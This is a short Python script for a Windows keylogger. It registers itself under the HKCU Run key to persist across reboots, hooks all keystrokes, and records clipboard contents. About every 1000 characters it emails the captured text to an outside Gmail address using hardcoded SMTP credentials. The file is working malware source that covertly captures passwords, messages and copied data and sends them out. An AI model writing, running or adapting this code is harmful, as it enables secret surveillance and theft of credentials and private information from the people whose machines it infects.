import keyboard
import pyperclip
import smtplib
import winreg
import os
import sys

queue = ""
last_copied = ""
i = 0

# http://opensecurity.in/xenotix-python-keylogger-for-windows/
def add_startup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key2change, "prueba_cvxz", 0, winreg.REG_SZ, new_file_path)


# Remote access
def upload():
    global i, queue
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls()
    s.login("x6432364@gmail.com", "##########")
    s.sendmail("x6432364@gmail.com", "heellxz@gmail.com", queue) 
    s.quit()
    print("email sent")

    i = 0
    queue = ""


# Process keys
def process_event(e):
    global i, queue, last_copied
    if e.event_type == "down":
        i += 1
        if len(e.name) == 1:
            queue += e.name
        elif e.name == "space":
            queue += " "
        elif e.name == "enter":
            queue += "\n[%s]" % e.name
        else:
            queue += "[%s]" % e.name

    if pyperclip.paste() != last_copied:
        queue += '\n[COPIED "%s"]\n' % pyperclip.paste()
        last_copied = pyperclip.paste()
        i += len(last_copied)

    if i > 1000:
        upload()


def main():
    add_startup()
    keyboard.hook(process_event)
    keyboard.wait()


if __name__ == '__main__':
    main()
